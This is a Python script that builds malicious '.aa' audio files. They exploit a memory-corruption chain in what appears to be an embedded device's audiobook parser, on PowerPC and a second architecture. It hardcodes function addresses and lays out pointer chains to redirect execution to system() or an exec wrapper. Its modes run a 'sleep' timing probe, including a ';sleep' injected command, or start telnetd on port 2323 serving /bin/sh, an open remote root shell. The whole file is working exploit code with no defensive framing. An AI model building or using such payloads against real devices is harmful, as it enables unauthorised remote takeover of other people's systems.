#!/usr/bin/env python3
"""Fingerprint / argv payloads for the .aa chain — one command per fire.

Modes
  fp <ms>     FN = system@plt, node arg = "sleep <ms>"   (timing fingerprint; P0/P1/P2)
  wrap        FN = the exec wrapper, argv array we place (real argv control)
  canary      FN = 0x51000000 (unmapped) — band check

ISA is chosen by `--isa ppc|s2`. S is the calibrated band address; the chain layout is
fixed (108/200/628/6404/23620) and only the *argument* construction differs:

  ppc  FN is called with r3 = B and [B] = V is forced, so argv[0] = V = node600 and the
       path string lives there, ending before the FN dword at V+28. The node arg is the
       command (system) or the argv array (wrap).
  s2   FN is called with a0 = node0, so node0 *is* the command (system) or the argv array
       (wrap), and the string lives at 700+ (bytes 108.. are chain dwords, 632..6403 free).

Usage
  probe_builder.py --isa s2 --s 0x70c000 --mode fp --ms 8
  probe_builder.py --isa ppc --s 0x106c4e10 --mode wrap
"""
import argparse
import struct

SYS = {"ppc": 0x105464B0, "s2": 0x6DCEA0}
WRAP = {"ppc": 0x104044C0, "s2": 0x656978}
CANARY = 0x51000000
K_A, K_B, K_V = 100, 200, 600
WRAP_PPC = [b"/usr/sbin/telnetd", b"-l", b"/bin/sh", b"-p", b"2323"]
WRAP_S2 = [b"/bin/sh", b"-c", b"/usr/sbin/telnetd -p 2323 -l /bin/sh"]


def main():
    a = argparse.ArgumentParser()
    a.add_argument("--isa", choices=("ppc", "s2"), required=True)
    a.add_argument("--s", required=True)
    a.add_argument("--mode", choices=("fp", "wrap", "canary"), required=True)
    a.add_argument("--ms", type=int, default=8)
    a.add_argument("--out", required=True)
    o = a.parse_args()
    S = int(o.s, 16)
    node = bytearray(24000)
    d = lambda off: S + 6380 + off          # node offset -> absolute (heap) address

    if o.isa == "ppc":
        v = d(K_V)
        if 0 in v.to_bytes(4, "big"):
            raise SystemExit("pick S with a NUL-free &node600 (%#x -> %s)" % (v, v.to_bytes(4, "big").hex()))
        node[K_B:K_B + 4] = struct.pack(">I", v)          # [B] = V (forced)
        node[K_A + 8:K_A + 12] = struct.pack(">I", d(K_B))
        node[6404:6408] = struct.pack(">I", d(K_A))
        node[23620:23624] = struct.pack(">I", d(0))
        node[23624:23628] = struct.pack(">I", 1)
        node[23628] = 1
        if o.mode == "canary":
            node[K_V + 28:K_V + 32] = struct.pack(">I", CANARY)
        elif o.mode == "fp":
            node[K_V + 28:K_V + 32] = struct.pack(">I", SYS["ppc"])
            cmd = b";sleep %d\x00" % o.ms
            node[K_B + 4:K_B + 4 + len(cmd)] = cmd
        else:                                              # wrap: argv[0] IS V
            node[K_V:K_V + len(WRAP_PPC[0]) + 1] = WRAP_PPC[0] + b"\x00"
            if K_V + len(WRAP_PPC[0]) + 1 > K_V + 28:
                raise SystemExit("path does not fit before V+28")
            node[K_V + 28:K_V + 32] = struct.pack(">I", WRAP["ppc"])
            cur, argv = K_V + 40, [v]
            for arg in WRAP_PPC[1:]:
                node[cur:cur + len(arg) + 1] = arg + b"\x00"
                argv.append(d(cur))
                cur += len(arg) + 1
            for i, ptr in enumerate(argv):
                node[K_B + 4 + 4 * i:K_B + 8 + 4 * i] = struct.pack(">I", ptr)
            node[K_B + 4 + 4 * len(argv):K_B + 8 + 4 * len(argv)] = b"\x00\x00\x00\x00"
        buf = bytes(node)
        out = bytes.fromhex("57907536") + struct.pack(">BII", 1, 5, 5) + \
            struct.pack(">BII", 2, 0x25, len(buf)) + struct.pack(">BII", 0, 0, 0) + b"acelp" + buf
    else:
        node[108:112] = struct.pack(">I", d(K_B))
        node[200:204] = struct.pack(">I", d(K_V))
        node[6404:6408] = struct.pack(">I", d(K_A))
        node[23620:23624] = struct.pack(">I", d(0))
        node[23624:23628] = struct.pack(">I", 1)
        node[23628] = 1
        if o.mode == "canary":
            node[628:632] = struct.pack(">I", CANARY)
        elif o.mode == "fp":
            node[628:632] = struct.pack(">I", SYS["s2"])
            cmd = b"sleep %d\x00" % o.ms
            if len(cmd) > 107:
                raise SystemExit("fp command exceeds the 107-byte node0 budget")
            node[0:len(cmd)] = cmd
        else:
            node[628:632] = struct.pack(">I", WRAP["s2"])
            cur = 700
            ptrs = []
            for arg in WRAP_S2:
                node[cur:cur + len(arg) + 1] = arg + b"\x00"
                ptrs.append(d(cur))
                cur += len(arg) + 1
            for i, ptr in enumerate(ptrs):
                node[4 * i:4 * i + 4] = struct.pack(">I", ptr)
            node[4 * len(ptrs):4 * len(ptrs) + 4] = b"\x00\x00\x00\x00"
        base = open("recon/tnzm_audible/sweep2/CAN135_00710000.aa", "rb").read()[:36]
        out = base + bytes(node)

    open(o.out, "wb").write(out)
    print("wrote %s (%d B) isa=%s mode=%s S=%#x" % (o.out, len(out), o.isa, o.mode, S))


if __name__ == "__main__":
    main()
